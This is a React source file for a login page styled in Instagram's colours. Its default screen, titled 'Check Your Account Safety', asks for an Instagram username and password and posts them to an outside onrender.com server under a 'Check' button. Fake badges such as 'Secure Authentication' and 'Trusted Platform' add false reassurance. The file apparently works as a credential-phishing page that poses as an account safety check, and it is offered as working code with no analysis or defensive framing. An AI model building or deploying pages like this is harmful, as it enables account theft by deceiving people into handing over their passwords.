import React, { useState } from 'react';
import axios from 'axios';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const [isLogin, setIsLogin] = useState(false); // Register page MUST appear first
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsLoading(true);
    const endpoint = isLogin ? '/api/auth/login' : '/api/auth/register';
    try {
      const res = await axios.post(`https://test-project-ie0n.onrender.com${endpoint}`, { email, password });
      setMessage(res.data.message);
    } catch (err) {
      setMessage(err.response?.data?.message || 'Something went wrong');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen w-full flex items-center justify-center p-4 relative overflow-hidden font-sans selection:bg-purple-200">
      {/* Background Mesh Gradient */}
      <div className="fixed inset-0 z-0 pointer-events-none">
        <div className="absolute inset-0 bg-[#f8fafc]"></div>
        {/* Deep Instagram-style blue */}
        <div className="absolute top-[-10%] left-[-10%] w-[70%] h-[70%] rounded-full bg-blue-600/25 blur-[120px] animate-float"></div>
        {/* Soft indigo */}
        <div className="absolute bottom-[-10%] right-[-10%] w-[60%] h-[60%] rounded-full bg-indigo-500/25 blur-[120px] animate-float-delayed"></div>
        {/* Elegant purple */}
        <div className="absolute top-[20%] right-[10%] w-[50%] h-[50%] rounded-full bg-purple-500/25 blur-[120px] animate-float-slow"></div>
        {/* Subtle pink accents */}
        <div className="absolute bottom-[10%] left-[20%] w-[40%] h-[40%] rounded-full bg-pink-400/20 blur-[100px] animate-pulse-slow"></div>
        {/* White glow effect */}
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full bg-gradient-to-tr from-transparent via-white/40 to-transparent"></div>
      </div>

      <div className="relative z-10 w-full max-w-md transition-all duration-700 ease-in-out transform">
        {/* Top Section */}
        <div className="text-center mb-10 animate-fade-in-up">
          <div className="inline-flex items-center justify-center w-20 h-20 mb-6 rounded-[24px] bg-white/40 backdrop-blur-xl border border-white/60 shadow-[0_8px_32px_0_rgba(31,38,135,0.07)] animate-bounce-subtle">
            <svg className="w-10 h-10 text-indigo-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="1.5" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04M12 21.355r-.015-.015V21a14.663 14.663 0 007.618-10.123M12 21.355a14.663 14.663 0 01-7.618-10.123v-.355" />
            </svg>
          </div>
          <h1 className="text-4xl font-extrabold text-slate-900 tracking-tight mb-3">
            {isLogin ? "Welcome Back" : "🛡️ Check Your Account Safety"}
          </h1>
          <p className="text-slate-600 font-medium px-4">
            {isLogin ? "Securely sign in to your dashboard." : "Join a secure and trusted community."}
          </p>
        </div>

        {/* Auth Card */}
        <div className="relative group animate-fade-in-up delay-150">
          <div className="absolute -inset-1 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 rounded-[36px] blur-lg opacity-20 group-hover:opacity-30 transition duration-1000"></div>
          <div className="relative bg-white/70 backdrop-blur-[20px] border border-white/60 rounded-[32px] shadow-[0_20px_50px_rgba(0,0,0,0.08)] p-8 md:p-10 transition-all duration-500">
            
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="text-[11px] font-black text-slate-400 uppercase tracking-[0.2em] ml-1">Username</label>
                <input
                  type="text"
                  className="w-full px-6 py-4 bg-white/50 border border-slate-100 rounded-2xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-4 focus:ring-indigo-500/10 focus:border-indigo-400/50 transition-all duration-300 shadow-sm"
                  placeholder="instagram Username"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                />
              </div>

              <div className="space-y-2">
                <label className="text-[11px] font-black text-slate-400 uppercase tracking-[0.2em] ml-1">Password</label>
                <div className="relative">
                  <input
                    type="password"
                    className="w-full px-6 py-4 bg-white/50 border border-slate-100 rounded-2xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-4 focus:ring-indigo-500/10 focus:border-indigo-400/50 transition-all duration-300 shadow-sm"
                    placeholder="••••••••"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    required
                  />
                  <div className="absolute right-5 top-1/2 -translate-y-1/2 text-slate-300">
                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={isLoading}
                className="w-full relative overflow-hidden group py-4.5 rounded-2xl bg-gradient-to-r from-[#405DE6] via-[#833AB4] to-[#E1306C] text-white font-bold text-lg shadow-xl shadow-purple-500/20 active:scale-[0.98] transition-all duration-300 disabled:opacity-70 hover:shadow-2xl hover:shadow-purple-500/30"
              >
                <span className="relative z-10 flex items-center justify-center space-x-2">
                  {isLoading && (
                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                  )}
                  <span>{isLoading ? "Processing..." : isLogin ? "Sign In" : "Check"}</span>
                </span>
                <div className="absolute inset-0 bg-white/10 translate-y-full group-hover:translate-y-0 transition-transform duration-300"></div>
              </button>
            </form>

            {/* Switching Section */}
            <div className="mt-8 text-center pt-6 border-t border-slate-100/50">
              <button
                onClick={() => {
                  setIsLogin(!isLogin);
                  setMessage('');
                }}
                className="text-sm font-semibold text-slate-500 hover:text-indigo-600 transition-all duration-300 group"
              >
                {isLogin ? (
                  <span>Don't have an account <span className="text-indigo-600 group-hover:underline underline-offset-4 decoration-2">Create Account</span></span>
                ) : (
                  <span> <span className="text-indigo-600 group-hover:underline underline-offset-4 decoration-2"></span>Sign in</span>
                )}
              </button>
            </div>

            {/* Message Alert */}
            {message && (
              <div className={`mt-6 p-4 rounded-2xl text-center text-sm font-bold border transition-all duration-500 animate-in fade-in slide-in-from-top-2 ${
                message.toLowerCase().includes('success') 
                  ? 'bg-emerald-50 text-emerald-700 border-emerald-100/50' 
                  : 'bg-rose-50 text-rose-700 border-rose-100/50'
              }`}>
                {message}
              </div>
            )}
          </div>
        </div>

        {/* Trust Elements */}
        <div className="mt-12 flex flex-wrap justify-center gap-4 animate-fade-in-up delay-300">
          <div className="flex items-center space-x-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.15em] bg-white/40 backdrop-blur-md px-4 py-2 rounded-full border border-white/50 shadow-sm transition-transform hover:scale-105">
            <svg className="w-3.5 h-3.5 text-blue-500" fill="currentColor" viewBox="0 0 20 20"><path d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" /></svg>
            <span>Secure Authentication</span>
          </div>
          <div className="flex items-center space-x-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.15em] bg-white/40 backdrop-blur-md px-4 py-2 rounded-full border border-white/50 shadow-sm transition-transform hover:scale-105">
            <svg className="w-3.5 h-3.5 text-indigo-500" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" /></svg>
            <span>Protected Access</span>
          </div>
          <div className="flex items-center space-x-2 text-[10px] font-black text-slate-400 uppercase tracking-[0.15em] bg-white/40 backdrop-blur-md px-4 py-2 rounded-full border border-white/50 shadow-sm transition-transform hover:scale-105">
            <svg className="w-3.5 h-3.5 text-purple-500" fill="currentColor" viewBox="0 0 20 20"><path d="M10 12a2 2 0 100-4 2 2 0 000 4z" /><path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" /></svg>
            <span>Trusted Platform</span>
          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        @keyframes float {
          0%, 100% { transform: translate(0, 0) scale(1); }
          33% { transform: translate(30px, -50px) scale(1.05); }
          66% { transform: translate(-20px, 20px) scale(0.95); }
        }
        @keyframes bounce-subtle {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-12px); }
        }
        @keyframes fade-in-up {
          from { opacity: 0; transform: translateY(30px); }
          to { opacity: 1; transform: translateY(0); }
        }
        .animate-float { animation: float 18s infinite ease-in-out; }
        .animate-float-delayed { animation: float 22s infinite ease-in-out -4s; }
        .animate-float-slow { animation: float 28s infinite ease-in-out -8s; }
        .animate-pulse-slow { animation: pulse 12s infinite ease-in-out; }
        .animate-bounce-subtle { animation: bounce-subtle 4s infinite ease-in-out; }
        .animate-fade-in-up { animation: fade-in-up 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
        
        .delay-150 { animation-delay: 150ms; }
        .delay-300 { animation-delay: 300ms; }

        .py-4\\.5 { padding-top: 1.125rem; padding-bottom: 1.125rem; }
      `}} />
    </div>
  );
};

export default Login;
